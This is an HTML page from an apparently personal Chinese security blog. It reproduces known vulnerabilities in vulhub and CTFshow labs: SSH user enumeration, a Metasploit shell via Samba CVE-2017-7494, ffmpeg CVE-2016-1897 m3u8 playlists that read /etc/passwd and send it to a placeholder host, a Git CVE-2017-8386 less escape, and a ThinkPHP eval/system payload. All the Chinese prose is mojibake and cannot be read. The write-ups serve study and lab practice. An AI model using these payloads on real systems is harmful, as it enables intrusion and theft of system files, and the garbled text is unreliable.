    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ­¤å¤„æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªç”¨æˆ·åå­—å…¸ï¼Œå¯ä»¥è‡ªè¡Œæ„é€ ï¼Œä¹Ÿå¯ä»¥ç”¨githubä¸Šé¢ä¸€ä¸ªå¼€æºé¡¹ç›®<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/" >SecLists</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ï¼ŒèŠ‚çº¦æ—¶é—´æˆ‘ä»¬è‡ªè¡Œæ„é€ ä¸€ä¸ªç®€çŸ­listï¼Œæœ€ç»ˆæµ‹è¯•ç»“æœå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">admin is not a valid user!
bin is a valid user!
sys is a valid user!
sync is a valid user!
games is a valid user!
man is a valid user!
lp is a valid user!
111 is not a valid user!
1243 is not a valid user!
sahdsa is not a valid user!
jalba is not a valid user!
dsa is not a valid user!
fe is not a valid user!
qf is not a valid user!
ds is not a valid user!
vc is not a valid user!
dsshg is not a valid user!
rsa is not a valid user!
grdfsbvfgd is not a valid user!
sb is not a valid user!
fgd is not a valid user!
s is not a valid user!
bgfd is not a valid user!
s is not a valid user!
g is not a valid user!
fds is not a valid user!
g is not a valid user!
fd is not a valid user!
sgf is not a valid user!
ds is not a valid user!
g is not a valid user!
fdsh is not a valid user!
tr is not a valid user!
wnbyrsbf is not a valid user!
dgs is not a valid user!
root is a valid user!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ˜¾ç„¶æ¼æ´å­˜åœ¨ï¼Œè€Œå½“æˆ‘ä»¬å¯¹é«˜çº§ç‰ˆæœ¬çš„SSHè¿›è¡Œæµ‹è¯•æ—¶ï¼Œexpå¤±æ•ˆ</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206171757123.png"></p>
</li>
</ol>

        <h2 id="Sambaï¼ˆSMBï¼‰"   >
          <a href="#Sambaï¼ˆSMBï¼‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#Sambaï¼ˆSMBï¼‰" class="headerlink" title="Sambaï¼ˆSMBï¼‰"></a>Sambaï¼ˆSMBï¼‰</h2>
      
        <h3 id="CVE-2017-7494"   >
          <a href="#CVE-2017-7494" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2017-7494" class="headerlink" title="CVE-2017-7494"></a>CVE-2017-7494</h3>
      <p>æ¼æ´å†…å®¹ï¼šåªéœ€è¦æœ‰ä¸€ä¸ªå¯ä»¥å†™å…¥æ–‡ä»¶çš„ç”¨æˆ·å°±å¯ä»¥ææƒåˆ°rootæƒé™</p>
<p>æ¼æ´ä½œç”¨ï¼šRCE</p>
<p>å½±å“èŒƒå›´ï¼šSamba 3.5.0 ä¹‹ååˆ°4.6.4/4.5.10/4.4.14ä¸­é—´çš„æ‰€æœ‰ç‰ˆæœ¬</p>
<p>æ¼æ´å¤ç°ï¼š</p>
<ol>
<li><p>vulhubç›´æ¥èµ·ä¸€ä¸ªdocker</p>
</li>
<li><p>ä½¿ç”¨msfæœç´¢å¯¹åº”æ¼æ´<code>search is_known_pipename</code></p>
</li>
<li><p>ä½¿ç”¨setå‘½ä»¤è®¾ç½®rhost</p>
</li>
<li><p>å¦‚æœå¯¹æ–¹æœåŠ¡å¼€å¯äº†åŒ¿åç™»å½•ç›´æ¥ä½¿ç”¨runå‘½ä»¤å³å¯ï¼Œå¦‚æœå·²çŸ¥ç”¨æˆ·åå¯†ç å¯ä½¿ç”¨set smbuserå’Œsmbpassæ¥æŒ‡å®šç”¨æˆ·ç™»å½•</p>
</li>
<li><p>æˆåŠŸæ‹¿shell</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208101616840.png"></p>
</li>
</ol>

        <h2 id="ffmpeg"   >
          <a href="#ffmpeg" class="heading-link"><i class="fas fa-link"></i></a><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h2>
      
        <h3 id="CVE-2016-1897"   >
          <a href="#CVE-2016-1897" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2016-1897" class="headerlink" title="CVE-2016-1897"></a>CVE-2016-1897</h3>
      <p>æ¼æ´å†…å®¹ï¼šé¦–å…ˆäº†è§£ä¸€ä¸‹m3u8æ–‡ä»¶æ ¼å¼ï¼Œm3u8æ˜¯ä¸€ç§ç´¢å¼•æ–‡ä»¶ï¼Œç”¨äºHLSåè®®ä¼ è¾“åª’ä½“æµï¼Œm3u8ç´¢å¼•æŒ‡å‘ä¸€ä¸ªä¸ªå°çš„åª’ä½“æµç¢ç‰‡</p>
<blockquote>
<p>ç®€è€Œè¨€ä¹‹ï¼Œ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://zh.wikipedia.org/wiki/HTTP_Live_Streaming" >HLS</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> æ˜¯æ–°ä¸€ä»£æµåª’ä½“ä¼ è¾“åè®®ï¼Œå…¶åŸºæœ¬å®ç°åŸç†ä¸ºå°†ä¸€ä¸ªå¤§çš„åª’ä½“æ–‡ä»¶è¿›è¡Œåˆ†ç‰‡ï¼Œå°†è¯¥åˆ†ç‰‡æ–‡ä»¶èµ„æºè·¯å¾„è®°å½•äº m3u8 æ–‡ä»¶ï¼ˆå³ playlistï¼‰å†…ï¼Œå…¶ä¸­é™„å¸¦ä¸€äº›é¢å¤–æè¿°ï¼ˆæ¯”å¦‚è¯¥èµ„æºçš„å¤šå¸¦å®½ä¿¡æ¯Â·Â·Â·ï¼‰ç”¨äºæä¾›ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯ä¾æ®è¯¥ m3u8 æ–‡ä»¶å³å¯è·å–å¯¹åº”çš„åª’ä½“èµ„æºï¼Œè¿›è¡Œæ’­æ”¾ã€‚</p>
</blockquote>
<p>ä¸€ä¸ªåŸºæœ¬çš„m3u8æ–‡ä»¶æ ¼å¼å¦‚ä¸‹</p>
<blockquote>
<ul>
<li><p>m3u8 æ–‡ä»¶å¿…é¡»ä»¥ utf-8 è¿›è¡Œç¼–ç ï¼Œä¸èƒ½ä½¿ç”¨ Byte Order Markï¼ˆBOMï¼‰å­—èŠ‚åºï¼Œ ä¸èƒ½åŒ…å« utf-8 æ§åˆ¶å­—ç¬¦ï¼ˆU+0000 ~ U_001F å’Œ U+007F ~ u+009Fï¼‰ã€‚</p>
</li>
<li><p>m3u8 æ–‡ä»¶çš„æ¯ä¸€è¡Œè¦ä¹ˆæ˜¯ä¸€ä¸ª URIï¼Œè¦ä¹ˆæ˜¯ç©ºè¡Œï¼Œè¦ä¹ˆå°±æ˜¯ä»¥ <strong>#</strong> å¼€å¤´çš„å­—ç¬¦ä¸²ã€‚ä¸èƒ½å‡ºç°ç©ºç™½å­—ç¬¦ï¼Œé™¤äº†æ˜¾ç¤ºå£°æ˜çš„å…ƒç´ ã€‚</p>
</li>
<li><p>m3u8 æ–‡ä»¶ä¸­ä»¥ <strong>#</strong> å¼€å¤´çš„å­—ç¬¦ä¸²è¦ä¹ˆæ˜¯æ³¨é‡Šï¼Œè¦ä¹ˆå°±æ˜¯æ ‡ç­¾ã€‚æ ‡ç­¾ä»¥ <strong>#EXT</strong> å¼€å¤´ï¼Œå¤§å°å†™æ•æ„Ÿã€‚</p>
</li>
<li><p>```<br>å„å‚æ•°è¯´æ˜ï¼š<br>#EXTM3U æ ‡ç­¾æ˜¯ m3u8 çš„æ–‡ä»¶å¤´ï¼Œå¼€å¤´å¿…é¡»è¦è¿™ä¸€è¡Œ<br>#EXT-X-MEDIA-SEQUENCE è¡¨ç¤ºæ¯ä¸€ä¸ªmedia URI åœ¨ PlayListä¸­åªæœ‰å”¯ä¸€çš„åºå·ï¼Œç›¸é‚»ä¹‹é—´åºå·+1<br>#EXTINF:10.0, è¡¨ç¤ºè¯¥ä¸€æ®µ TS æµæ–‡ä»¶çš„é•¿åº¦<br>#EXT-X-ENDLIST è¿™ä¸ªç›¸å½“äºæ–‡ä»¶ç»“æŸç¬¦</p>
<pre class="line-numbers language-none"><code class="language-none">
&#96;&#96;&#96;m3u8
#EXTM3U
#EXT-X-TARGETDURATION:10
#EXTINF:9.009,
http:&#x2F;&#x2F;media.example.com&#x2F;first.ts
#EXTINF:9.009,
http:&#x2F;&#x2F;media.example.com&#x2F;second.ts
#EXTINF:3.003,
http:&#x2F;&#x2F;media.example.com&#x2F;third.ts
#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</blockquote>
<p>è€Œåœ¨ffmpegç‰¹å®šç‰ˆæœ¬ä¸­å¹¶æ²¡æœ‰å¯¹URIè¿›è¡Œä»»ä½•æ£€æŸ¥ï¼Œæ­¤å¤„å¯å¯¼è‡´SSRFï¼Œåªéœ€è¦ç›‘å¬ä¸€ä¸ªç«¯å£ç„¶åç›´æ¥è®¿é—®å³å¯éªŒè¯</p>
<p>ä»»æ„æ–‡ä»¶è¯»å–æˆå› æ˜¯åœ¨ffmpegä¸­æœ‰concatå‡½æ•°å¯ä»¥å¯¹URIè¿›è¡Œæ‹¼æ¥ï¼Œæˆ‘ä»¬åªè¦å°†æ–‡ä»¶ä½œä¸ºhttpè¯·æ±‚çš„å‚æ•°å³å¯å¸¦å‡ºï¼Œä½†ç›´æ¥ä½¿ç”¨concatå¹¶ä¸ä¼šå¯¹æ–‡ä»¶è¯·æ±‚è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå°æŠ€å·§ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ä¸»m3u8è®¿é—®æ¬¡çº§m3u8æ¥ä½¿å¾—æ–‡ä»¶è¢«è¯»å–</p>
<p>kkk.txt</p>
<pre class="line-numbers language-none"><code class="language-none">#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http:&#x2F;&#x2F;xxx&#x2F;test.txt|file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd
#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>text.txt</p>
<pre class="line-numbers language-none"><code class="language-none">#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http:&#x2F;&#x2F;xxx&#x2F;?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>xxx.m3u8</p>
<pre class="line-numbers language-none"><code class="language-none">#EXTM3U
#EXT-X-TARGETDURATION:6
#EXTINF:10.0,
concat:http:&#x2F;&#x2F;xxx&#x2F;kkk.txt
#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å°†kkk.txtå’Œtext.txtéƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åç”¨ffmpegå¤„ç†xxx.m3u8æ–‡ä»¶å³å¯å¸¦å‡ºpasswdæ–‡ä»¶é¦–è¡Œ</p>

        <h2 id="Git"   >
          <a href="#Git" class="heading-link"><i class="fas fa-link"></i></a><a href="#Git" class="headerlink" title="Git"></a>Git</h2>
      
        <h3 id="CVE-2017-8386"   >
          <a href="#CVE-2017-8386" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2017-8386" class="headerlink" title="CVE-2017-8386"></a>CVE-2017-8386</h3>
      <p>æ¼æ´æˆå› ï¼š</p>
<ul>
<li><p>å½“æˆ‘ä»¬æƒ³ä»githubå…‹éš†ä¸€ä»½ä»£ç ä¸‹æ¥çš„æ—¶å€™ï¼Œä¼šæœ‰sshå…‹éš†çš„é€‰é¡¹ï¼Œæˆ‘ä»¬å»éšä¾¿æä¸€ä¸ªåœ°å€ï¼Œæ‰¾åˆ°Clone with SSHé‡Œåˆ—å‡ºçš„åœ°å€ï¼š<code>git@github.com:Jlan45/j1an.github.io.git</code>å…¶å®å°±æ˜¯é€šè¿‡sshåè®®è¿æ¥githubä½¿ç”¨gitç”¨æˆ·å°†è¿™ä¸ªæ–‡ä»¶æä¸‹æ¥</p>
</li>
<li><p>é‚£æˆ‘ä»¬çŒœæƒ³ä¸€ä¸‹ï¼Œæ˜¯ä¸æ˜¯ç›´æ¥sshé“¾æ¥å°±èƒ½å’Œæˆ‘ä»¬é“¾æ¥ä¸€ä¸ªæœåŠ¡å™¨ä¸€æ ·å»æ‰§è¡Œå‘½ä»¤å‘¢</p>
</li>
<li><p>æµ‹è¯•å‘ç°æˆ‘ä»¬ç¡®å®è¿æ¥ä¸Šäº†æœåŠ¡å™¨ï¼Œä½†æ˜¯æœåŠ¡å™¨ç»™æˆ‘ä»¬å¼¹äº†ä¸€å¥è¯å°±è®©æˆ‘ä»¬å¼ºåˆ¶é€€å‡ºäº†</p>
</li>
<li><p>è¿™æ˜¯æ€ä¹ˆåšåˆ°çš„å’§</p>
</li>
<li><blockquote>
<p>é‚£ä¹ˆï¼Œgithubè¿™ç±»gitæœåŠ¡å•†æ˜¯æ€ä¹ˆå®ç°ä¸Šè¿°â€œå®‰å…¨â€é€šä¿¡çš„æµç¨‹çš„å‘¢ï¼Ÿ</p>
<p>è®©ç”¨æˆ·å¯ä»¥é€šè¿‡sshè®¤è¯èº«ä»½ï¼Œä½†åˆä¸ç»™ç”¨æˆ·shellï¼Œè¿™ä¸ªè¿‡ç¨‹æœ‰ä¸¤ç§æ–¹æ³•å®ç°ï¼š</p>
<p>åˆ›å»ºç³»ç»Ÿç”¨æˆ·gitçš„æ—¶å€™å°†å…¶shellè®¾ç½®æˆgit-shell<br>åœ¨authorized_keysæ–‡ä»¶æ¯ä¸ªssh-keyçš„å‰é¢è®¾ç½®commandï¼Œè¦†ç›–æˆ–åŠ«æŒé‡å†™åŸæœ¬çš„å‘½ä»¤<br>ç¬¬ä¸€ç§æ–¹æ³•æ¯”è¾ƒç›´è§‚ï¼Œå°±æ˜¯åˆ›å»ºç”¨æˆ·çš„æ—¶å€™ä¸ç»™å…¶æ­£å¸¸çš„bashæˆ–shçš„shellï¼Œè€Œæ˜¯ç»™å®ƒä¸€ä¸ªgit-shellã€‚git-shellæ˜¯ä¸€ä¸ªæ²™ç›’ç¯å¢ƒï¼Œåœ¨git-shellä¸‹ï¼Œåªå…è®¸æ‰§è¡Œæ²™ç›’å†…åŒ…å«çš„å‘½ä»¤ã€‚<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œå»ºç“¯æœ€åã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/JiangBuLiu/article/details/95065034" >https://blog.csdn.net/JiangBuLiu/article/details/95065034</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</blockquote>
</li>
<li><p>åœ¨githubä¸­ç¡®å®æ˜¯åªæœ‰è¿™ä¸‰æ¡å‘½ä»¤å¯ç”¨</p>
<ul>
<li><code>git-receive-pack &lt;argument&gt;</code></li>
<li><code>git-upload-pack &lt;argument&gt;</code></li>
<li><code>git-upload-archive &lt;argument&gt;</code></li>
</ul>
</li>
<li><p>ä½†æ˜¯åé¢æœ‰äº†å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡â€“helpæ¥æ‰“å¼€ä¸€ä¸ªmané¡µé¢ï¼Œå¹¶ä¸”å…¶ä¼šè‡ªåŠ¨è°ƒç”¨lesså‘½ä»¤ï¼Œè€Œé€šè¿‡lesså‘½ä»¤æˆ‘ä»¬å°±èƒ½ç›´æ¥é€šè¿‡<code>shift+e</code>é”®æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç”šè‡³å¯ä»¥é€šè¿‡<code>!å‘½ä»¤</code>æ¥å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œ</p>
</li>
</ul>
<p>æ¼æ´å†…å®¹ï¼šé€šè¿‡githubçš„SSHå®ç°ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>æ¼æ´å¤ç°ï¼š</p>
<ol>
<li><p>é¦–å…ˆè¿˜æ˜¯vulhubå¯ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹æœ‰id_rsaç§é’¥æ–‡ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥é€šè¿‡è¿™ä¸ªç§é’¥æ¥è¿æ¥dockerï¼Œå¹¶ä¸”æ‰§è¡Œ<code>git-upload-archive &#39;--help&#39;</code>å‘½ä»¤</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209010033494.png"></p>
<p>å¯ä»¥çœ‹åˆ°å‘½ä»¤æ‰§è¡ŒæˆåŠŸè¿›å…¥äº†mané¡µé¢</p>
</li>
<li><p>å°è¯•è¯»å–/etc/passwd<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209010034597.png"></p>
<p>è¯»å–æˆåŠŸ</p>
</li>
</ol>
<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/ad1540aa.html">ç ´ç ´çƒ‚çƒ‚ç¢ç¢çŸ¥è¯†æ±‡æ€»</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-06-15</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-10-26</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/ad1540aa.html" data-flag-title="ç ´ç ´çƒ‚çƒ‚ç¢ç¢çŸ¥è¯†æ±‡æ€»"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><h2 id="HTTPéƒ¨åˆ†è¯·æ±‚å¤´"   >
          <a href="#HTTPéƒ¨åˆ†è¯·æ±‚å¤´" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTPéƒ¨åˆ†è¯·æ±‚å¤´" class="headerlink" title="HTTPéƒ¨åˆ†è¯·æ±‚å¤´"></a>HTTPéƒ¨åˆ†è¯·æ±‚å¤´</h2>
      
        <h3 id="Transfer-Encoding"   >
          <a href="#Transfer-Encoding" class="heading-link"><i class="fas fa-link"></i></a><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3>
      <p>å…¶ä¸­ä¸­æœ‰ä¸€ç±»ç‰¹å®šç¼–ç :chunkedç¼–ç .è¯¥ç¼–ç å°†å®ä½“åˆ†å—ä¼ é€å¹¶é€å—æ ‡æ˜é•¿åº¦,ç›´åˆ°é•¿åº¦ä¸º0å—è¡¨ç¤ºä¼ è¾“ç»“æŸ, è¿™åœ¨å®ä½“é•¿åº¦æœªçŸ¥æ—¶ç‰¹åˆ«æœ‰ç”¨(æ¯”å¦‚ç”±æ•°æ®åº“åŠ¨æ€äº§ç”Ÿçš„æ•°æ®)ï¼Œè¯¥ç¼–ç æ ¼å¼ä¸º</p>
<pre class="line-numbers language-none"><code class="language-none">Transfer-Encoding: chunked\r\n
\r\n
16è¿›åˆ¶è¡¨ç¤ºä¸‹ä¸€ä¸ªåˆ†å—çš„é•¿åº¦\r\n
è¦å‘é€çš„æ•°æ®\r\n
é‡å¤ä¸Šåˆ—æ•°æ®ç›´åˆ°æœ€ç»ˆç»“å°¾ä½¿ç”¨ä¸€ä¸ªç©ºçš„æ•°æ®å—æ¥è¡¨ç¤ºå†…å®¹ç»“æŸ
0\r\n
\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><div class="post-readmore"><a class="post-readmore__link" href="/posts/ad1540aa.html"><span class="post-readmore__text">é˜…è¯»å…¨æ–‡</span><span class="post-readmore__icon"><i class="fas fa-long-arrow-alt-right"></i></span></a></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/80a6314c.html">CTFshowThinkPHPä¸“é¢˜</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-06-12</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-06-14</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/80a6314c.html" data-flag-title="CTFshowThinkPHPä¸“é¢˜"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ThinkPHP"   >
          <a href="#ThinkPHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1>
      <p>ä¸€äº›ThinkPHPçš„åŸºç¡€çŸ¥è¯†ï¼š</p>
<ol>
<li><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1696" >å…³äºThinkPHPçš„æ¨¡å—åŒ–è®¾è®¡</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1710" >å…³äºThinkPHPçš„é—­åŒ…æ”¯æŒ</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
</ol>
<p><strong>569</strong></p>
<p>çŸ¥é“æ¨¡å—åŒ–è®¾è®¡å°±å¾ˆç®€å•äº†</p>
<pre class="line-numbers language-none"><code class="language-none">å…¸å‹è®¿é—®è§„åˆ™
http:&#x2F;&#x2F;serverName&#x2F;index.phpï¼ˆæˆ–è€…å…¶ä»–åº”ç”¨å…¥å£æ–‡ä»¶ï¼‰&#x2F;æ¨¡å—&#x2F;æ§åˆ¶å™¨&#x2F;æ“ä½œ&#x2F;[å‚æ•°å&#x2F;å‚æ•°å€¼...]
&#x2F;index.php&#x2F;Admin&#x2F;Login&#x2F;ctfshowLogin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>570</strong></p>
<p>é—­åŒ…è·¯ç”±ï¼Œç±»ä¼¼äºå°†/åè·¯å¾„ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè®¾å®šé—­åŒ…è·¯ç”±çš„æ–‡ä»¶åœ¨æ–‡ä»¶æ ¹ç›®å½•/Common/Conf/config.phpä¸­</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token string single-quoted-string">'URL_ROUTER_ON'</span>   <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> 
<span class="token string single-quoted-string">'URL_ROUTE_RULES'</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span>
   <span class="token string single-quoted-string">'ctfshow/:f/:a'</span> <span class="token operator">=></span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
   	<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   	<span class="token punctuation">&#125;</span>
   <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸€ä¸ªæ˜æ˜¾çš„åé—¨ï¼Œpayloadå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;ctfshow&#x2F;assert&#x2F;eval($_POST[1])
POST:
1&#x3D;system(&#39;tac &#x2F;*&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>571</strong></p>
<p>showæ–¹æ³•å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ</p>
<blockquote>

        <h2 id="æ¸²æŸ“å†…å®¹"   >
          <a href="#æ¸²æŸ“å†…å®¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ¸²æŸ“å†…å®¹" class="headerlink" title="æ¸²æŸ“å†…å®¹"></a>æ¸²æŸ“å†…å®¹</h2>
      <p>å¦‚æœä½ æ²¡æœ‰å®šä¹‰ä»»ä½•æ¨¡æ¿æ–‡ä»¶ï¼Œæˆ–è€…æŠŠæ¨¡æ¿å†…å®¹å­˜å‚¨åˆ°æ•°æ®åº“ä¸­çš„è¯ï¼Œä½ å°±éœ€è¦ä½¿ç”¨showæ–¹æ³•æ¥æ¸²æŸ“è¾“å‡ºäº†ï¼Œshowæ–¹æ³•çš„è°ƒç”¨æ ¼å¼ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">show(&#39;æ¸²æŸ“å†…å®¹&#39;[,&#39;å­—ç¬¦ç¼–ç &#39;][,&#39;è¾“å‡ºç±»å‹&#39;])ä¾‹å¦‚ï¼Œ$this-&gt;show($content);
ä¹Ÿå¯ä»¥æŒ‡å®šç¼–ç å’Œç±»å‹ï¼š $this-&gt;show($content, &#39;utf-8&#39;, &#39;text&#x2F;xml&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</blockquote>
<p>é‚£ä¹ˆæˆ‘ä»¬å»çœ‹çœ‹showæ–¹æ³•åˆ°åº•æ‰§è¡Œäº†ä»€ä¹ˆ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">show</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
